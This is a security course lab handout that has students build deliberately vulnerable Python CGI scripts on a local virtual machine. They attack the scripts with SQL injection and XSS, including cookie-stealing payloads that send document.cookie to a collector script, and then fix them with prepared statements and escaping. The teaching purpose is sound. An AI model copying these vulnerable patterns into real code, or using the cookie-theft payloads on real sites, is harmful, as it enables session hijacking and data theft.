# SQL Injection and XSS Vulnerabilities #

This week, we will investigate SQL Injection and Cross Site Scripting vulnerabilities. Parts 1 and 2 will cover SQL Injection while Parts 3 onwards will cover Cross-site Scripting.

From Wikipedia, we have the following definitions:

SQL injection

> A code injection technique, used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker).

Cross-site scripting (XSS)

> A type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side script into web pages viewed by other users.

# Part 1: Database Setup #

* Note: We will continue to use the virtual machine you set up in last week's lab. If you need to set it up again, refer to Part 2 from last week.

## Quick Virtual Machine Setup ##

Once you have your virtual machine running, ssh into it with:

	ssh -p 3030 -l user360 localhost

To become root in the virtual machine you will need to use the command `su` (use the root password provided).

| what | user    | password   |
|------|---------|------------|
| user | user360 | user360    |
| root | root    | root360lab |

If you're rebuilding your VM, you may need to re-enable CGI on Apache with the following instructions as root (you did this last week as well):

	a2enmod cgi
	service apache2 restart

## Postgres DB Setup ##

As the user `user360`, we need to create a database called `lab7`. To do that, we will use `psql` to connect and configure.

	psql -d postgres

 - PostgreSQL Cheat Sheet: [https://www.petefreitag.com/cheatsheets/postgresql/](https://www.petefreitag.com/cheatsheets/postgresql/)
 - To exit psql console, use `\q`

Once logged in, create the `lab7` database.

	CREATE DATABASE lab7;

Change over to that database.

	\c lab7

Then create a table called `test` with the following schema.

```sql
CREATE TABLE test(
   id integer PRIMARY KEY,
   value integer);
```

Allow anybody `select` to the table `test`:

	GRANT SELECT ON test TO public;

Insert 10 tuples into the table `test`.  Make sure you include a tuple with `id=5`.

```sql
INSERT INTO test VALUES (1,10),(2,20),(3,30),(4,40),(5,30),(6,40),(7,30),(8,40),(9,1030),(10,1040);
```

The table should looks something like this.

	lab7=> select * from test;
	 id | value
	----+-------
	  1 |    10
	  2 |    20
	  3 |    30
	  4 |    40
	  5 |    30
	  6 |    40
	  7 |    30
	  8 |    40
	  9 |  1030
	 10 |  1040
	(10 rows)

Once your table is verified, exit out of Postgres.

In the next step, you will be creating a Postgres user called `web` with password `webserver`. See [https://www.postgresql.org/docs/9.1/static/app-createuser.html](https://www.postgresql.org/docs/9.1/static/app-createuser.html).

You will need to do this as user **postgres**. To become the postgres user, first make yourself root with `su`. Then do `su postgres` to switch over to the postgres user. Then do the following:

	cd ~
	createuser -P web

Test that the user `web` can connect to the database and see the table

	psql -h localhost -U web lab7

# Part 2: Python and SQL Injection #

- Note: At this point, I recommend making yourself the `root` user in the VM. If you are still the postgres user, you may use the `exit` command to stop being postgres and roll back to being root.

Change yourself to the `root` user and move to the following directory. This should be familiar from last week:

	su
	cd /usr/lib/cgi-bin

Use the following python script and save it as `sql.py`. Place your python script in the `/usr/lib/cgi-bin` folder. It should be able to display the tuple with id value equal 5 (make sure there is one in your table). Remember to grant the script execution permissions.

```python
#!/usr/bin/python

import psycopg2

try:
    conn = psycopg2.connect("dbname='lab7' user='web' host='localhost' password='webserver'")
except:
    print "I am unable to connect to the database"

cur = conn.cursor()

id = "5"

try:
    cur.execute("SELECT * from test where id = " + id)

except:
    print "I can't SELECT from test"


rows = cur.fetchall()
print "Content-type: text/html";
print ""
print "<h2>Data</h2>"
print "<table border=1>"
for row in rows:
    print "<tr><td>", row[0], '</td><td>', row[1], '</td></tr>'

print "</table>"
```

## Create a cgi-script ##

Convert this program into a cgi-script that uses the GET method to set the value of `id`. It responds to this request:

[http://localhost:3080/cgi-bin/sql.py?id=6](http://localhost:3080/cgi-bin/sql.py?id=6)

Notice how you're getting the result for 5 instead of 6 (the script I provided hardcodes 5 as the id). You need to change the script so that handles GET requests. See [https://www.tutorialspoint.com/python/python_cgi_programming.htm](https://www.tutorialspoint.com/python/python_cgi_programming.htm) for information on how to do this. Hint: look at the *Passing Information Using GET Method* section example.

- If you're getting server errors, try looking at the apache log file found here: `/var/log/apache2/error.log`

Take a look at [https://www.w3schools.com/tags/ref_httpmethods.asp](https://www.w3schools.com/tags/ref_httpmethods.asp)

**Question 1** What is the difference between using a POST and a GET?

**Question 2** Is one HTTP method more secure than the other? Explain.

## An injection attack ##

Try now the following URL:

[http://localhost:3080/cgi-bin/sql.py?id=5%20or%20TRUE](http://localhost:3080/cgi-bin/sql.py?id=5%20or%20TRUE)

**Question 3** What is the result of this query? Why? (Hint: decode the `%20` (it is a character in hexadecimal) then follow the value of id).

## Fix your script ##

Learn how to protect your script with prepared statements. Then fix your sql.py script.

- Hint: [Prepared Statements in Psycogp2](http://initd.org/psycopg/articles/2012/10/01/prepared-statements-psycopg/)

**Question 4** How is the sql injection vulnerability removed?

# Part 3: Cross-site Scripting Attacks #

Cross-scripting attacks are another common way to get into Web applications.

* For this part of the lab make sure that you use **Firefox**.

## Create another form ##

Create a Web page called `xssForm.cgi` with the following contents:

```python
#!/usr/bin/python

print("Content-Type: text/html\n\n")
print("""
<html>
  <Title>Hello in HTML</Title>
<body>
<h1>Cross scripting attack</h1>

This form will help us test cross-scripting attacks.

<form action="xssSimple.py" method="get">
User: <input type="text" name="user"><br>
<input type="hidden" name="notshown" value="abc"><br>
<input type="submit" value="Submit">
</form>
</body>
</html>
""")
```

Test it at [http://localhost:3080/cgi-bin/xssForm.cgi](http://localhost:3080/cgi-bin/xssForm.cgi). Don't forget to update the file permissions with `chmod 755 <file>`.

## Create the script that will respond to this form ##

Create a script `xssSimple.py` that will respond to the form. Its contents should be:

```python
#!/usr/bin/python

import cgi, cgitb 

print "Content-type: text/html"
print ""

# Create instance of FieldStorage 
form = cgi.FieldStorage() 
user = form.getvalue('user')

if "user" not in form:
    print "<H1>Error</H1>"
    print "Please fill in the <b>user</b> field."
    exit

print "<h1>Example of Simple Cross Scripting attack</h3>"
print "Hello [" + user + "]"
```

Don't forget to update the file permissions with `chmod 755 <file>`.

## Test the script ##

Test the script by going to [http://localhost:3080/cgi-bin/xssForm.cgi](http://localhost:3080/cgi-bin/xssForm.cgi) and submitting a value in the `user` field on the form.

## A simple attack ##

In the form, submit the following (in the field `user`)

	<font color=red><b>attack</b></font>

then try this:

	<h1>attack</h1>

**Question 5:** Explain the impact of the attack and how it works.

## A more active attack ##

Are you using **Firefox**? If not, then use it. This next attack requires Firefox.

Input the following value in the *user* field and hit submit again:

	<script>alert('attacked');</script>

# Part 4: Cookie Stealing #

Create a script that sets a cookie. Call this script `xssCookies.py`

```python
#!/usr/bin/env python

import cgi, cgitb 

import time, Cookie

# Instantiate a SimpleCookie object
cookie = Cookie.SimpleCookie()

# The SimpleCookie instance is a mapping
cookie['seng360'] = 'secret-'+str(time.time())

# Output the HTTP message containing the cookie
print cookie
print 'Content-Type: text/html\n'

# Create instance of FieldStorage 
form = cgi.FieldStorage() 
user = form.getvalue('user')

if "user" not in form:
    print "No <b>user</b> field has been set."
else:
    print "<h3>Hello [" + user + "]</h3>"

print '<br><hr>'
print 'Server time is', time.asctime(time.localtime())
print '</body></html>'
```

Load the script. Now inspect the cookies in your browser to make sure the cookie was set. (In Firefox you can find the cookies in Preferences > Privacy > Show Cookies.) Make sure the cookie is set.

- You may need to change the Remember History option on the Privacy tab to Use custom settings for history.

Let us create another web page to test it. This time we will call it `xssForm2.cgi`

```python
#!/usr/bin/python

print("Content-Type: text/html\n\n")
print("""
<html>
  <Title>Hello in HTML</Title>
<body>
<h1>Cross scripting attack</h1>

This form will help us test cross-scripting attacks.

<form action="xssCookies.py" method="get">
User: <input type="text" name="user"><br>
<input type="hidden" name="notshown" value="abc"><br>
<input type="submit" value="Submit">
</form>
</body>
</html>
""")
```

Test it at [http://localhost:3080/cgi-bin/xssForm2.cgi](http://localhost:3080/cgi-bin/xssForm2.cgi). It should behave as expected. Remember your file permissions.

Lastly, we need to create the redirection target for our xss attack. This page will intercept and display the cookie.

Create another file and name it `xssAttack.py`

```python
#!/usr/bin/env python

import cgi, cgitb
import time, Cookie

print 'Content-Type: text/html\n'

# Create instance of FieldStorage
form = cgi.FieldStorage()
cookie = form.getvalue('cookie')

if "cookie" not in form:
    print "No <b>cookie</b> intercepted\n"
else:
    print "Intercepted Cookie: " + cookie + "\n"

print '<br><hr>'
print 'Server time is', time.asctime(time.localtime())
print '</body></html>'
```

## Stealing the cookie ##

Now pass the following string in the user field:

	<a href="xssCookies.py" onClick="javascript:document.location.replace('http://localhost:3080/cgi-bin/xssAttack.py?cookie=' + escape(document.cookie)); return false;">victim</a>

As you can see, the location where the username should be displayed is now replaced with a "victim" link. Follow it. Look at the resulting URL. Inspect the URL that you were trying to retrieve.

**Question 6:** What URL is displayed when the mouse is hovered over the link?

**Question 7:** What is the full URL that the link actually went to? Why is this an attack?

This attack is very pernicious. It is capable of stealing all the cookies of a site by simply logging the access to the destination website. At this point, you could easily forge a cookie and hijack that session.

Try passing the following string into the user field:

	<script>document.location="http://localhost:3080/cgi-bin/xssAttack.py?cookie="+document.cookie</script>

**Question 8:** What happens when you click submit? Is this expected?

# Part 5: Cross-scripting attacks using Chrome #

Try the same attacks on Chrome.

**Question 9:** Which of the attacks did not succeed when using Chrome? Why?

# Part 6: Fix the XSS vulnerabilities

Fix the vulnerabilities in your scripts `xssSimple.py` and `xssCookies.py`.

- Hint: see *cgi.escape* in [https://docs.python.org/2/library/cgi.html](https://docs.python.org/2/library/cgi.html)

# Part 7: Source Code Handling #

The next three questions involve you copy-pasting your three fixed scripts `sql.py`, `xssSimple.py` and `xssCookies.py` into your report. These files are currently residing in the `/usr/lib/cgi-bin` folder of your VM.

To pull these files back out of the VM, you can either copy-paste them out from the terminal, or you could use SCP to transfer them out to the host machine's current directory:

	scp -P 3030 'user360@localhost:/usr/lib/cgi-bin/*.py' .

**Question 10** Copy-paste your fixed `sql.py` SQL script as your answer.

**Question 11** Copy-paste your fixed `xssSimple.py` form script as your answer.

**Question 12** Copy-paste your fixed `xssCookies.py` cookies script as your answer.

# Submission #

You will be submitting one file:

- `report.txt` Your answers to the 12 questions